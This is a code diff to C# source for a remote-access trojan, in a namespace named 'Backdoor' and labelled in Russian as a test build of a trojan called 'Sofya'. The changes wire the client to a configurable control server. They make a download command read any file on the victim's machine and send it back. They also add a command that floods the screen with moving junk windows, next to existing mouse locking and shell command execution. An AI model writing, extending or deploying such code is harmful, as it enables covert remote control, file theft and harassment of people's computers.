@@ -10,6 +10,7 @@ using System.Text.RegularExpressions;
 using System.Xml;
 using System.Drawing;
 using System.Threading;
+using System.Collections.Generic;
 
 namespace Backdoor
 {
@@ -19,7 +20,7 @@ namespace Backdoor
         {
             Console.WriteLine("Привет это тестовая сборка трояна Софья(или София или Cоня и Софа)");
             Console.WriteLine("Консоль можно будет скрыть в настройках");
-            var server = new Server();
+            var server = new Server(Settings.ipAdr, Settings.port);
             server.Connect();
         }
 
@@ -29,6 +30,12 @@ namespace Backdoor
         private string adress = "127.0.0.1";
         private int port = 7777;
         private Socket conn = new Socket(new AddressFamily(), SocketType.Stream, ProtocolType.Tcp);
+
+        public Server(string adr, int sockPort)
+        {
+            adress = adr;
+            port = sockPort;
+        }
 
         public void Connect()
         {
@@ -160,8 +167,7 @@ namespace Backdoor
                     {
                         data = data.Remove(0, 3);
                         string comm = ParseComand(data);
-                        conn.Send(File.ReadAllBytes(comm));
-                        conn.Send(Encoding.UTF8.GetBytes("Не получилось скачать файл"));
+                        conn.Send(executor.GetFileFroUpload(comm));
                         continue;
                     }
                     if (data.StartsWith("transl"))
@@ -210,6 +216,32 @@ namespace Backdoor
                             conn.Send(Encoding.UTF8.GetBytes("курсор разблокирован"));
                             continue;
                         }
+                        else
+                        {
+                            throw new Exception("блокировка курсора: неверный аргумент");
+                        }
+                    }
+                    if (data.StartsWith("dirtyScreen"))
+                    {
+                        data = data.Remove(0, 11);
+                        string comm = ParseComand(data);
+                        if (comm.StartsWith("true"))
+                        {
+                            comm = comm.Remove(0, 5);
+                            executor.SpamScreenFromWindows(comm);
+                            conn.Send(Encoding.UTF8.GetBytes("экран замусорен"));
+                            continue;
+                        }
+                        if (comm.StartsWith("false"))
+                        {
+                            executor.DestroySpamWindows();
+                            conn.Send(Encoding.UTF8.GetBytes("очищено"));
+                            continue;
+                        }
+                        else
+                        {
+                            throw new Exception("мусорить экран системы: неверный аргумент");
+                        }
                     }
                 }
                 catch (Exception e)
@@ -235,6 +267,7 @@ namespace Backdoor
     public class CommandExecutor
     {
         private static Thread blockMouseThread = null;
+        private static List<Thread> SpamWindows = new List<Thread>();
 
         [System.Runtime.InteropServices.DllImport("user32")]
         private static extern int SetCursorPos(int x, int y);
@@ -308,9 +341,9 @@ namespace Backdoor
             var t = new Thread(() => Process.Start(path));
             t.Start();
         }
-        public byte[] GetFileFroUpload()
+        public byte[] GetFileFroUpload(string path)
         {
-            return new byte[1];
+            return File.ReadAllBytes(path);
         }
         public string ExecuteCmdCommand(string comm)
         {
@@ -378,6 +411,59 @@ namespace Backdoor
             Byte[] bytesForSend = stream.ToArray();
 
             return bytesForSend;
+        }
+        private void CreateSpamWindow(bool moveWindow)
+        {
+            var r = new Random();
+            var window = new Form();
+            window.Show();
+            window.SetBounds(r.Next(0, Screen.PrimaryScreen.Bounds.Width), r.Next(0, Screen.PrimaryScreen.Bounds.Height), window.Width, window.Height);
+            while (true)
+            {
+                if (moveWindow)
+                {
+                    window.SetBounds(r.Next(0, Screen.PrimaryScreen.Bounds.Width), r.Next(0, Screen.PrimaryScreen.Bounds.Height), window.Width, window.Height);
+                }
+                Thread.Sleep(r.Next(100, 600));
+            }
+        }
+        public void SpamScreenFromWindows(string arguments)
+        {
+            XmlDocument doc = new XmlDocument();
+            doc.LoadXml(arguments);
+
+            XmlNode root = doc.FirstChild;
+
+            var windowsValue = 1;
+            var moveWindows = false;
+
+            if (root.HasChildNodes)
+            {
+                for (int i = 0; i < root.ChildNodes.Count; i++)
+                {
+                    if (root.ChildNodes[i].Name == "windowsValue")
+                    {
+                        windowsValue = int.Parse(root.ChildNodes[i].InnerText);
+                    }
+                    if(root.ChildNodes[i].Name == "moveWindows")
+                    {
+                        moveWindows = root.ChildNodes[i].InnerText == "True";
+                    }
+                }
+            }
+            for (int i = 0; i < windowsValue; i++)
+            {
+                Thread thread = new Thread(() => CreateSpamWindow(moveWindows));
+                thread.Start();
+                SpamWindows.Add(thread);
+            }
+        }
+        public async void DestroySpamWindows()
+        {
+            for (int i = 0; i < SpamWindows.Count; i++)
+            {
+                await System.Threading.Tasks.Task.Run(() => SpamWindows[i].Abort());
+            }
         }
         public void LockMouse()
         {
